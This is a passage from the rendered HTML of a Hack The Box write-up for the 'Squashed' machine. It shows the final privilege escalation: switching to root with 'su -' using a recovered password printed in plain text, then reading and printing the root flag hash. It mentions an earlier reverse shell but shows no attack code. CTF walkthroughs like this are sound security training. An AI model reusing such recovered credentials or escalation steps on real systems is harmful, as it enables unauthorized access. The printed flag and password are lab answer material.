+</span><span class="z-text z-plain">Permission denied, please try again.
+</span></code></pre>
+<p>Unfortunately, it doesn't work.</p>
+<p>Let's go back to our reverse shell and try to directly impersonate <code>root</code> then.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">alex@squashed:/var/www/html$</span></span><span class="z-meta z-function-call z-arguments z-shell"> su -</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Password: cah$mei7rai9A
+</span><span class="z-text z-plain">root@squashed:~#
+</span></code></pre>
+<p>It worked!</p>
+<h1 id="local-enumeration-1">Local enumeration</h1>
+<h2 id="home-folder-1">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the root flag!</p>
+<p>As usual, we can find it in our home folder.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">root@squashed:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>#</span></span><span class="z-meta z-function-call z-arguments z-shell"> cat <span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>/root.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">8fc362d55b1482e29e9968e2984151d4
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/squashed/success.png" alt="Success" /></p>
+<p>That's it for this box! I found the foothold to be really clever and interesting. The privilege escalation was a bit hard to perform, as it was the first time I had to mess with the X11 windowing system, but I learned a lot.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
